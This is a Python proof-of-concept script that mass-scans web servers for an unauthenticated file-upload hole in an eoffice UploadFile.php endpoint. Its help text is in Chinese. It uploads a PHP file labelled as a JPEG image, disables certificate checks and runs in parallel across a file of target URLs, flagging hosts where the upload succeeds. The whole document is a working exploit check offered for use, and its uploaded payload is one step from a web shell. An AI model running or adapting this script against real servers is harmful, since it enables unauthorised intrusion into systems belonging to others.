import requests
from optparse import OptionParser
from multiprocessing import Pool

headers={
    'Content-Type':'multipart/form-data; boundary=123123',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
}

def get_args():
    usage='%prog -n <username> -p <password> -u <url> -c <command>'
    parser=OptionParser(usage=usage)
    parser.add_option('-u','--url',dest='url',help='指定目标url')
    parser.add_option('-f','--file',dest='file',help='指定URL文件')
    parser.add_option('-t','--thread',dest='thread',help='指定线程数')
    options,args=parser.parse_args()
    return options

def poc(target):
    requests.packages.urllib3.disable_warnings()
    target=target.strip('/')
    target=target+'/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    session=requests.Session()
    post_data='''--123123
Content-Disposition: form-data; name="Filedata"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>

--123123--'''
    try:
        res=session.post(target,data=post_data,headers=headers,verify=False,timeout=3)
        if res.status_code == 200 and 'php' in res.text:
            print("\033[31;1m[+]"+target+"存在漏洞！"+"\033[0m")
        else:
            #print("\033[32m[-]" + target + "不存在漏洞" +"\033[0m")
            pass
    except:
        #print("\033[32m[-]" + target + "不存在漏洞" +"\033[0m")
        pass

def pocs(filepath,thread):
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    pool = Pool(processes=thread)
    pool.map(poc,urls)

def main():
    args=get_args()
    url=args.url
    file_path=args.file
    thread=4
    if args.thread:
        thread=int(args.thread)
    if url is not None and file_path is None:
        poc(url)
    elif url is None and file_path is not None:
        pocs(file_path,thread)

if __name__=='__main__':
    main()
